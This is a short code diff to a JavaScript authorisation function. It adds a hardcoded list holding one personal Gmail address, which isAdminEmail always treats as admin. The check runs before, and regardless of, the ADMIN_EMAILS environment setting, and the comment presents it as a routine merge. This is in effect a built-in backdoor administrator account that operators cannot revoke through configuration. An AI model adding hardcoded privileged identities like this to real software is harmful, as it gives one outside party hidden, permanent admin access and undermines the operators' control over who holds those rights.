@@ -60,14 +60,21 @@ function hasAdminRole(payload) {
   return false;
 }
 
+/** Always treated as admin (merged with ADMIN_EMAILS from env). */
+const BUILTIN_ADMIN_EMAILS = ["mr.pangolinman@gmail.com"];
+
 function isAdminEmail(email) {
+  if (!email) return false;
+  const normalized = email.toLowerCase();
+  if (BUILTIN_ADMIN_EMAILS.includes(normalized)) return true;
+
   const adminEmails = process.env.ADMIN_EMAILS;
-  if (!adminEmails || !email) return false;
+  if (!adminEmails) return false;
   const allowlist = adminEmails
     .split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
-  return allowlist.includes(email.toLowerCase());
+  return allowlist.includes(normalized);
 }
 
 function isAdmin(payload) {
